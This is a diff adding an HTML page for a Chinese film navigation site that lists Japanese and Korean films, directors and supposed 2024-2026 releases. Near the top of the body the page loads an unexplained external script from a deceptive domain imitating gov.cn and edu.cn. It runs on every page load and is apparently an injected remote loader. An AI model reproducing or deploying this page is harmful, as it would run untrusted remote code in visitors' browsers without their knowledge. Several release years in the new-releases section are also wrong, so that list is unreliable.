@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日韩电影网 - 日本物哀·韩国锐利 东亚双生电影导航</title>
+<meta name="description" content="日韩电影网（rihandianyingwang-h5）整理日本治愈/物哀/动画与韩国悬疑/阶级/复仇/现实批判类经典与新片，深靛蓝+樱粉+韩红胶片风，移动端自适应，必应收录友好。">
+<meta name="keywords" content="日韩电影网, rihandianyingwang-h5, 日本电影, 韩国电影, 物哀, 悬疑, 阶级, 朴赞郁, 奉俊昊, 是枝裕和, 新海诚, 釜山行, 寄生虫">
+<meta name="author" content="日韩电影网">
+<meta name="robots" content="index, follow">
+<style>
+:root{
+  --ink:#10131f;
+  --ink2:#171b2b;
+  --panel:#1b2030;
+  --line:#2a3147;
+  --jp:#7fb0ff;
+  --jp-deep:#3f6fd6;
+  --kr:#ff5b73;
+  --kr-deep:#e0233f;
+  --sakura:#ff7aa2;
+  --paper:#f6f1e7;
+  --gold:#d8b15a;
+  --muted:#9aa3bd;
+  --txt:#e9ecf6;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:
+    radial-gradient(720px 480px at 12% -8%,rgba(63,111,214,.22),transparent 60%),
+    radial-gradient(720px 520px at 92% 4%,rgba(224,35,63,.20),transparent 60%),
+    var(--ink);
+  color:var(--txt);line-height:1.85;overflow-x:hidden;
+}
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;background-image:url("data:image/svg+xml,%3Csvg width='80' height='80' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.015'%3E%3Ccircle cx='8' cy='8' r='1.4'/%3E%3Ccircle cx='48' cy='40' r='1.2'/%3E%3C/g%3E%3C/svg%3E")}
+a{color:var(--sakura);text-decoration:none;transition:.3s}
+a:hover{color:var(--kr)}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px;position:relative;z-index:2}
+
+/* 顶栏 */
+.bar{position:sticky;top:0;z-index:50;background:rgba(16,19,31,.86);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.bar-in{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{display:flex;align-items:center;gap:12px;font-weight:900;letter-spacing:2px}
+.flag{font-size:22px;filter:drop-shadow(0 2px 6px rgba(255,91,115,.4))}
+.brand b{color:var(--sakura)}
+.brand i{font-style:normal;font-size:8px;letter-spacing:2px;color:var(--muted);display:block;font-family:ui-monospace,Consolas,monospace}
+.nav{display:flex;gap:2px;list-style:none}
+.nav a{padding:8px 13px;font-size:12px;font-weight:700;color:var(--txt);border-radius:999px;border:1px solid transparent}
+.nav a:hover,.nav a.active{background:linear-gradient(135deg,var(--jp-deep),var(--kr-deep));color:#fff;border-color:transparent}
+.burger{display:none;background:none;border:none;color:var(--sakura);font-size:22px;cursor:pointer}
+
+/* Hero */
+.hero{padding:84px 0 60px;text-align:center;position:relative;z-index:2}
+.kicker{font-size:11px;letter-spacing:6px;color:var(--gold);border:1px solid var(--gold);padding:5px 16px;border-radius:999px;display:inline-block}
+.hero h1{font-size:clamp(34px,7.5vw,60px);font-weight:900;letter-spacing:3px;margin:18px 0 12px}
+.hero h1 .jp{color:var(--jp)}
+.hero h1 .kr{color:var(--kr)}
+.hero p{max-width:620px;margin:0 auto 24px;color:var(--muted);font-size:15px}
+.dual{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;margin-bottom:26px}
+.chip{font-size:12px;font-weight:800;padding:8px 16px;border-radius:999px;border:1px solid var(--line)}
+.chip.jp{color:var(--jp);border-color:var(--jp-deep);background:rgba(63,111,214,.12)}
+.chip.kr{color:var(--kr);border-color:var(--kr-deep);background:rgba(224,35,63,.12)}
+.chip.s{color:var(--sakura);border-color:var(--sakura);background:rgba(255,122,162,.12)}
+.cta{display:inline-block;padding:13px 36px;border-radius:999px;font-weight:800;letter-spacing:2px;color:#fff;background:linear-gradient(135deg,var(--jp-deep),var(--kr-deep));box-shadow:0 12px 30px rgba(224,35,63,.28)}
+.cta:hover{transform:translateY(-3px);color:#fff}
+
+/* 双轴区 */
+.split{display:grid;grid-template-columns:1fr 1fr;gap:22px;margin-top:8px}
+.col{border:1px solid var(--line);border-radius:18px;padding:18px;background:linear-gradient(180deg,var(--panel),var(--ink2))}
+.col.jp{border-top:3px solid var(--jp)}
+.col.kr{border-top:3px solid var(--kr)}
+.col h3{font-size:18px;letter-spacing:2px;margin-bottom:4px}
+.col.jp h3{color:var(--jp)}
+.col.kr h3{color:var(--kr)}
+.col .sub{font-size:12px;color:var(--muted);margin-bottom:14px}
+.mini{display:flex;flex-direction:column;gap:10px}
+.card{display:grid;grid-template-columns:46px 1fr;gap:12px;align-items:center;background:rgba(255,255,255,.02);border:1px solid var(--line);border-radius:12px;padding:10px 12px;transition:.3s}
+.card:hover{transform:translateX(4px);border-color:var(--sakura)}
+.card .emoji{font-size:24px;text-align:center}
+.card h4{font-size:14px}
+.card p{font-size:11px;color:var(--muted)}
+.card .yr{font-family:ui-monospace,Consolas,monospace;font-size:10px;color:var(--gold)}
+
+/* 区块通用 */
+.section{padding:56px 0;position:relative;z-index:2}
+.head{display:flex;align-items:baseline;justify-content:space-between;border-bottom:1px solid var(--line);padding-bottom:10px;margin-bottom:26px}
+.head h2{font-size:clamp(20px,4vw,26px);font-weight:900;letter-spacing:3px}
+.head h2::before{content:"▎"}
+.head a{font-size:12px;color:var(--muted)}
+
+/* 大师 */
+.masters{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:18px}
+.m{master-card;background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:18px;position:relative;overflow:hidden;transition:.35s}
+.m{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:18px;transition:.35s}
+.m:hover{transform:translateY(-6px);box-shadow:0 18px 36px rgba(0,0,0,.4);border-color:var(--gold)}
+.m .country{position:absolute;top:14px;right:14px;font-size:10px;font-weight:800;padding:3px 9px;border-radius:999px}
+.m .country.jp{background:var(--jp-deep);color:#fff}
+.m .country.kr{background:var(--kr-deep);color:#fff}
+.m .face{font-size:38px;margin-bottom:8px}
+.m h4{font-size:16px}
+.m .role{font-size:12px;color:var(--gold);margin:2px 0 6px}
+.m p{font-size:12px;color:var(--muted)}
+
+/* 新片 */
+.news{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:14px}
+.npc{border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--panel);transition:.3s}
+.npc:hover{transform:scale(1.03);border-color:var(--sakura)}
+.npc .top{height:96px;display:grid;place-items:center;font-size:34px;background:linear-gradient(160deg,#222a40,#10131f)}
+.npc .body{padding:12px}
+.npc .flag2{font-size:10px;font-weight:800;font-family:ui-monospace,Consolas,monospace}
+.npc h4{font-size:14px;margin:4px 0}
+.npc p{font-size:11px;color:var(--muted)}
+
+/* 关于 */
+.note{max-width:840px;margin:0 auto;background:var(--panel);border:1px solid var(--line);border-left:4px solid var(--sakura);border-radius:14px;padding:30px}
+.note h3{font-size:18px;margin-bottom:12px;letter-spacing:1px}
+.note p{font-size:14px;color:#c7cde0;margin-bottom:10px}
+.twin{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:16px}
+.twin div{border:1px solid var(--line);border-radius:12px;padding:14px;font-size:13px}
+.twin .jp{border-left:3px solid var(--jp)}
+.twin .kr{border-left:3px solid var(--kr)}
+.lnks{margin-top:16px;display:flex;gap:10px;flex-wrap:wrap}
+.lnks a{padding:8px 16px;border:1px solid var(--line);border-radius:999px;font-size:13px;color:var(--txt)}
+.lnks a:hover{border-color:var(--sakura);color:var(--sakura)}
+
+/* 页脚 */
+.foot{border-top:1px solid var(--line);padding:30px 18px;text-align:center;color:var(--muted);font-size:13px;position:relative;z-index:2}
+.foot .big{font-size:17px;font-weight:900;color:var(--txt);letter-spacing:2px;margin-bottom:8px}
+.foot .url{color:var(--sakura)}
+
+@media(max-width:820px){
+  .split{grid-template-columns:1fr}
+  .twin{grid-template-columns:1fr}
+}
+@media(max-width:760px){
+  .nav{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:rgba(16,19,31,.97);border-bottom:1px solid var(--line);padding:8px 14px}
+  .nav.open{display:flex}.nav a{padding:13px 15px}
+  .burger{display:block}
+}
+@media(max-width:480px){
+  .hero{padding:52px 0 36px}
+  .section{padding:36px 0}
+  .masters{grid-template-columns:1fr 1fr;gap:12px}
+  .m .face{font-size:28px}
+  .news{grid-template-columns:1fr 1fr;gap:12px}
+  .npc .top{height:74px;font-size:26px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="bar">
+  <div class="wrap bar-in">
+    <div class="brand"><span class="flag">🎌</span><div>日韩<b>电影网</b><i>RIHANDIANYINGWANG-H5</i></div></div>
+    <ul class="nav" id="nav">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#dual">日 × 韩</a></li>
+      <li><a href="#masters">双生大师</a></li>
+      <li><a href="#news">新片场</a></li>
+      <li><a href="#about">双生花手记</a></li>
+    </ul>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</div>
+
+<header class="hero wrap" id="home">
+  <span class="kicker">JAPAN MONO NO AWARE × KOREA SHARP REALISM</span>
+  <h1><span class="jp">日本物哀</span> · <span class="kr">韩国锐利</span></h1>
+  <p>rihandianyingwang-h5 · 一边是雪国情书、汤屋奇遇、四季家庭；一边是阶级寓言、丧尸列车、复仇三部曲。东亚电影的双子星，都收在这里。</p>
+  <div class="dual">
+    <span class="chip jp">🇯🇵 物哀 / 治愈 / 动画 / 家庭</span>
+    <span class="chip kr">🇰🇷 悬疑 / 阶级 / 复仇 / 现实</span>
+    <span class="chip s">🌸 东方美学双生花</span>
+  </div>
+  <a href="#dual" class="cta">进放映厅</a>
+</header>
+
+<section class="section wrap" id="dual">
+  <div class="head"><h2>日 × 韩 双轴放映厅</h2><a href="#">完整片单 →</a></div>
+  <div class="split">
+    <div class="col jp">
+      <h3>🇯🇵 日本：把情绪折进物哀里</h3>
+      <div class="sub">MONO NO AWARE · 静、慢、余味</div>
+      <div class="mini">
+        <div class="card"><div class="emoji">✉️</div><div><h4>情书 <span class="yr">1995</span></h4><p>岩井俊二 / 雪国暗恋，纯爱天花板</p></div></div>
+        <div class="card"><div class="emoji">🏯</div><div><h4>千与千寻 <span class="yr">2001</span></h4><p>宫崎骏 / 汤屋、成长与自我</p></div></div>
+        <div class="card"><div class="emoji">🌊</div><div><h4>海街日记 <span class="yr">2015</span></h4><p>是枝裕和 / 镰仓四季、姐妹家庭</p></div></div>
+        <div class="card"><div class="emoji">🚗</div><div><h4>驾驶我的车 <span class="yr">2021</span></h4><p>滨口龙介 / 村上春树、失去与重生</p></div></div>
+        <div class="card"><div class="emoji">☄️</div><div><h4>你的名字。 <span class="yr">2016</span></h4><p>新海诚 / 彗星、羁绊、时空</p></div></div>
+      </div>
+    </div>
+    <div class="col kr">
+      <h3>🇰🇷 韩国：把现实切成血与火</h3>
+      <div class="sub">SHARP REALISM · 锐、烈、刺痛</div>
+      <div class="mini">
+        <div class="card"><div class="emoji">🏠</div><div><h4>寄生虫 <span class="yr">2019</span></h4><p>奉俊昊 / 阶级鸿沟、奥斯卡最佳影片</p></div></div>
+        <div class="card"><div class="emoji">🚄</div><div><h4>釜山行 <span class="yr">2016</span></h4><p>延尚昊 / 丧尸列车、人性实验</p></div></div>
+        <div class="card"><div class="emoji">🔥</div><div><h4>老男孩 <span class="yr">2003</span></h4><p>朴赞郁 / 复仇三部曲、暴力诗意</p></div></div>
+        <div class="card"><div class="emoji">🕯️</div><div><h4>燃烧 <span class="yr">2018</span></h4><p>李沧东 / 村上春树、存在与饥饿</p></div></div>
+        <div class="card"><div class="emoji">📜</div><div><h4>小姐 <span class="yr">2016</span></h4><p>朴赞郁 / 东方哥特、悬疑爱情</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section wrap" id="masters" style="background:linear-gradient(180deg,transparent,rgba(216,177,90,.05))">
+  <div class="head"><h2>双生大师 / TWIN AUTEURS</h2><a href="#">导演专题 →</a></div>
+  <div class="masters">
+    <div class="m"><span class="country jp">🇯🇵 日本</span><div class="face">🎐</div><h4>黑泽明</h4><div class="role">武士史诗 / 影史丰碑</div><p>《七武士》《罗生门》——把东方道义拍成暴雨与刀光。</p></div>
+    <div class="m"><span class="country kr">🇰🇷 韩国</span><div class="face">🎩</div><h4>奉俊昊</h4><div class="role">阶级寓言 / 类型天才</div><p>《寄生虫》《杀人回忆》——商业外壳里装着社会 X 光。</p></div>
+    <div class="m"><span class="country jp">🇯🇵 日本</span><div class="face">🐱</div><h4>宫崎骏</h4><div class="role">吉卜力 / 奇幻成长</div><p>《千与千寻》《龙猫》——孩子看童话，大人看失去。</p></div>
+    <div class="m"><span class="country kr">🇰🇷 韩国</span><div class="face">🥀</div><h4>朴赞郁</h4><div class="role">暴力美学 / 复仇诗人</div><p>《老男孩》《小姐》——美到窒息，也痛到窒息。</p></div>
+    <div class="m"><span class="country jp">🇯🇵 日本</span><div class="face">🍶</div><h4>是枝裕和</h4><div class="role">家庭 / 日常神性</div><p>《小偷家族》《海街日记》——不哭喊，却渗进骨头。</p></div>
+    <div class="m"><span class="country kr">🇰🇷 韩国</span><div class="face">🔥</div><h4>李沧东</h4><div class="role">文学性 / 存在悬疑</div><p>《燃烧》《诗》——把“看不见的饥饿”拍成电影。</p></div>
+  </div>
+</section>
+
+<section class="section wrap" id="news">
+  <div class="head"><h2>新片场 / 2024-2026</h2><a href="#">更多新片 →</a></div>
+  <div class="news">
+    <div class="npc"><div class="top">🚂</div><div class="body"><div class="flag2" style="color:var(--jp)">🇯🇵 2024</div><h4>怪物</h4><p>是枝裕和 / 校园悬疑·多视角</p></div></div>
+    <div class="npc"><div class="top">🕵️</div><div class="body"><div class="flag2" style="color:var(--kr)">🇰🇷 2025</div><h4>分手的决心</h4><p>朴赞郁 / 悬疑爱情·山海之间</p></div></div>
+    <div class="npc"><div class="top">🧸</div><div class="body"><div class="flag2" style="color:var(--jp)">🇯🇵 2024</div><h4>苍鹭与少年</h4><p>宫崎骏 / 亡灵世界·自我追问</p></div></div>
+    <div class="npc"><div class="top">🧳</div><div class="body"><div class="flag2" style="color:var(--kr)">🇰🇷 2024</div><h4>掮客</h4><p>是枝裕和拍韩影 / 弃婴·温柔罪</p></div></div>
+    <div class="npc"><div class="top">🌃</div><div class="body"><div class="flag2" style="color:var(--kr)">🇰🇷 2025</div><h4>破墓</h4><p>张宰贤 / 民俗恐怖·风水驱邪</p></div></div>
+    <div class="npc"><div class="top">🎆</div><div class="body"><div class="flag2" style="color:var(--jp)">🇯🇵 2025</div><h4>蓦然回首</h4><p>藤本树改编 / 少女·画画·星空</p></div></div>
+  </div>
+</section>
+
+<section class="section wrap" id="about">
+  <div class="head"><h2>东亚双生花手记</h2></div>
+  <div class="note">
+    <h3>“日本电影教你怎么安静地疼，韩国电影教你怎么尖锐地醒。”</h3>
+    <p>日韩电影网（rihandianyingwang-h5）不做盗版源、不挂播放器，只做东亚电影导航：把日本的温度和韩国的锋利并排摆给你，让片单自己说话。</p>
+    <div class="twin">
+      <div class="jp">🇯🇵 <b>日本侧</b>：物哀、留白、家庭、青春、动画、慢火治愈。代表词：情书 / 千与千寻 / 海街日记 / 驾驶我的车。</div>
+      <div class="kr">🇰🇷 <b>韩国侧</b>：阶级、悬疑、复仇、现实批判、类型混合。代表词：寄生虫 / 釜山行 / 老男孩 / 燃烧。</div>
+    </div>
+    <p style="margin-top:14px">本站为静态影视导航页，不存储、不分发视频文件；片单来自公开影评与影展资料，如有版权问题请联系下架。</p>
+    <div class="lnks">
+      <a href="#">日本治愈片单</a><a href="#">韩国悬疑片单</a><a href="#">吉卜力全集</a><a href="#">朴赞郁专题</a><a href="#">奉俊昊专题</a><a href="#">2025 新片表</a>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="big">日韩电影网 · RIHANDIANYINGWANG-H5</div>
+  <p><a href="#home">首页</a> | <a href="#dual">日×韩</a> | <a href="#masters">双生大师</a> | <a href="#news">新片场</a> | <a href="#about">双生花手记</a></p>
+  <p>官网：<span class="url">https://rihandianyingwang-h5.github.io</span></p>
+  <p>© 2026 日韩电影网 · 一盏清酒，一杯烧酒，都是东亚的光。</p>
+</footer>
+
+<script>
+const burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger&&burger.addEventListener('click',()=>nav.classList.toggle('open'));
+const secs=document.querySelectorAll('section[id],header[id]');
+const links=nav.querySelectorAll('a');
+addEventListener('scroll',()=>{let cur='home';secs.forEach(s=>{if(scrollY>=s.offsetTop-90)cur=s.id});links.forEach(l=>{l.classList.remove('active');if(l.getAttribute('href')==='#'+cur)l.classList.add('active')})});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const t=document.querySelector(a.getAttribute('href'));if(t)t.scrollIntoView({behavior:'smooth',block:'start'});nav.classList.remove('open')})});
+</script>
+</body>
+</html>
